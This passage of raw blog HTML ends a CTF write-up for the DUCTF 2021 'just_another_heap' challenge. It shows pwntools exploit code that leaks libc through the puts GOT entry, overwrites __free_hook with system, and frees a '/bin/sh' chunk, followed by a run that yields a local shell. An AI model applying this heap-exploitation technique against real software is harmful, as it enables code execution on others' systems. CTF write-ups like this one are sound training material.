</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">forget</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;forget?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_list</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>With the wrapper functions, we select the address where the very last name would be stored, which in our case is 0x6022a8</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">memory_ptr_last_idx</span> <span class="o">=</span> <span class="mh">0x6022a8</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">huge</span> <span class="o">=</span> <span class="mh">0xFFFF0FFFFFFF</span>
</span></span></code></pre></div><p>Then, we firstly create a chunk which will act as a decoy for performing rest of the exploit, we create this chunk, making the 0x6022a8 will point to the BBBBBBBBBBBBBBBB. We will also create a chunk with the name being /bin/sh\x00</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, we will force the malloc to return NULL then make the offset to the pointer of the last chunk[9] which we overwrite with GOT address of the puts, giving us a LIBC leak.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="n">memory_ptr_last_idx</span> <span class="o">+</span> <span class="p">(</span><span class="n">huge</span> <span class="o">-</span> <span class="n">memory_ptr_last_idx</span><span class="p">),</span> <span class="n">memory_ptr_last_idx</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">_list</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;9: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="n">byteorder</span><span class="o">=</span><span class="s2">&#34;little&#34;</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFF</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;__free_hook&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Libc base @ &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
</span></span></code></pre></div><p>Now, doing the same, but this time we will force the malloc to again return the NULL and make the offset value to the address of the __free_hook.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0xF</span><span class="p">,</span> <span class="n">free_hook</span> <span class="o">+</span> <span class="p">(</span><span class="n">huge</span> <span class="o">-</span> <span class="n">free_hook</span><span class="p">),</span> <span class="n">free_hook</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, we just free the chunk 2 which had the /bin/sh string stored resulting in system(&quot;/bin/sh&quot;):-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">forget</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><p>Run the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">vagrant@ubuntu-bionic:</span><span class="err">~/</span><span class="nf">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf$</span> <span class="no">python3</span> <span class="no">just_another_heap.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">just_another_heap</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf</span><span class="err">/</span><span class="no">libc.so.6</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">just_another_heap</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">1865</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Libc</span> <span class="no">base</span> <span class="err">@</span> <span class="mi">0x7f83be251000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">vagrant</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">vagrant</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">vagrant</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span><span class="line"><span class="cl"><span class="nl">vagrant@ubuntu-bionic:</span><span class="err">~/</span><span class="nf">sharedFolder</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">ductf$</span> 
</span></span></code></pre></div>
    </section>
    <footer class="pt-8">
      
  
  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/ductf/&amp;quote=DCTF%20-%202021"
          title="Share on Facebook"
          aria-label="Share on Facebook"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://x.com/intent/tweet/?url=http://localhost:1313/posts/ductf/&amp;text=DCTF%20-%202021"
          title="Post on X"
          aria-label="Post on X"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/posts/ductf/&amp;description=DCTF%20-%202021"
          title="Pin on Pinterest"
          aria-label="Pin on Pinterest"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://reddit.com/submit/?url=http://localhost:1313/posts/ductf/&amp;resubmit=true&amp;title=DCTF%20-%202021"
          title="Submit to Reddit"
          aria-label="Submit to Reddit"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/ductf/&amp;title=DCTF%20-%202021"
          title="Share on LinkedIn"
          aria-label="Share on LinkedIn"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="mailto:?body=http://localhost:1313/posts/ductf/&amp;subject=DCTF%20-%202021"
          title="Send via email"
          aria-label="Send via email"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://www.threads.net/intent/post?text=http://localhost:1313/posts/ductf/%20DCTF%20-%202021"
          title="Post on Threads"
          aria-label="Post on Threads"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M331.5 235.7c2.2 .9 4.2 1.9 6.3 2.8c29.2 14.1 50.6 35.2 61.8 61.4c15.7 36.5 17.2 95.8-30.3 143.2c-36.2 36.2-80.3 52.5-142.6 53h-.3c-70.2-.5-124.1-24.1-160.4-70.2c-32.3-41-48.9-98.1-49.5-169.6V256v-.2C17 184.3 33.6 127.2 65.9 86.2C102.2 40.1 156.2 16.5 226.4 16h.3c70.3 .5 124.9 24 162.3 69.9c18.4 22.7 32 50 40.6 81.7l-40.4 10.8c-7.1-25.8-17.8-47.8-32.2-65.4c-29.2-35.8-73-54.2-130.5-54.6c-57 .5-100.1 18.8-128.2 54.4C72.1 146.1 58.5 194.3 58 256c.5 61.7 14.1 109.9 40.3 143.3c28 35.6 71.2 53.9 128.2 54.4c51.4-.4 85.4-12.6 113.7-40.9c32.3-32.2 31.7-71.8 21.4-95.9c-6.1-14.2-17.1-26-31.9-34.9c-3.7 26.9-11.8 48.3-24.7 64.8c-17.1 21.8-41.4 33.6-72.7 35.3c-23.6 1.3-46.3-4.4-63.9-16c-20.8-13.8-33-34.8-34.3-59.3c-2.5-48.3 35.7-83 95.2-86.4c21.1-1.2 40.9-.3 59.2 2.8c-2.4-14.8-7.3-26.6-14.6-35.2c-10-11.7-25.6-17.7-46.2-17.8H227c-16.6 0-39 4.6-53.3 26.3l-34.4-23.6c19.2-29.1 50.3-45.1 87.8-45.1h.8c62.6 .4 99.9 39.5 103.7 107.7l-.2 .2zm-156 68.8c1.3 25.1 28.4 36.8 54.6 35.3c25.6-1.4 54.6-11.4 59.5-73.2c-13.2-2.9-27.8-4.4-43.4-4.4c-4.8 0-9.6 .1-14.4 .4c-42.9 2.4-57.2 23.2-56.2 41.8l-.1 .1z"/></svg>
</span></a
        >
      
    
      
        <a
          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
          href="https://telegram.me/share/url?text=http://localhost:1313/posts/ductf/&amp;url=DCTF%20-%202021"
          title="Share on Telegram"
          aria-label="Share on Telegram"
          target="_blank"
          rel="noopener noreferrer"
          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
</span></a
        >
      
    
  </section>


    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex list-none flex-col sm:flex-row">
        
          
          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
            
              <a
                href="/tags/"
                title=""
                
                ><span
                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
                    >Tags</span
                  >
                </a
              >
            
          </li>
        
      </ul>
    </nav>
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            Copy, <em>right?</em> 🤔
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
        <div
          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        >
          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
            <div
              class="flex h-12 w-12 items-center justify-center dark:hidden"
              title="Switch to dark appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
            </div>
            <div
              class="hidden h-12 w-12 items-center justify-center dark:flex"
              title="Switch to light appearance"
            >
              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
            </div>
          </button>
        </div>
      
    </div>
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://localhost:1313/"
>
  <div
    id="search-modal"
    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex flex-none items-center justify-between px-2">
      <form class="flex min-w-0 flex-auto items-center">
        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
